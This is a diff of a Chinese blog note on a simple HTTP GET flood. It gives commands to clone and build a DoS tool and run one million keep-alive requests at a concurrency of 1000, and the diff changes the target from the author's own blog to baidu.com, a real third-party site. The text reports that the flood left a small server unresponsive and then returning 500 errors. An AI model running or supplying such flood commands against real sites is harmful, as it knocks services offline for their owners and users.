@@ -22,13 +22,9 @@ draft: false
 git clone https://github.com/wenfengshi/ddos-dos-tools.git
 cd ddos-dos-tools/http-get-dos
 make
-./http_get_dos -n 1000000 -c 1000 -H "Connection: keep-alive" http://blog.frytea.com/
+./http_get_dos -n 1000000 -c 1000 -H "Connection: keep-alive" http://www.baidu.com/
 ```
 
 实测采用一台1m阿里云服务器对1m轻量服务器攻击，网站无响应
 
-![%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84http-%20186ab/Untitled.png](📒%20Note/knowledge/计算机网络%2072284/一次简单的http-%20186ab/Untitled.png)
-
 实测再加入搬瓦工1G口KVM对阿里云1M轻量服务器攻击，网站瞬间500.
-
-![%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84http-%20186ab/Untitled%201.png](📒%20Note/knowledge/计算机网络%2072284/一次简单的http-%20186ab/Untitled%201.png)
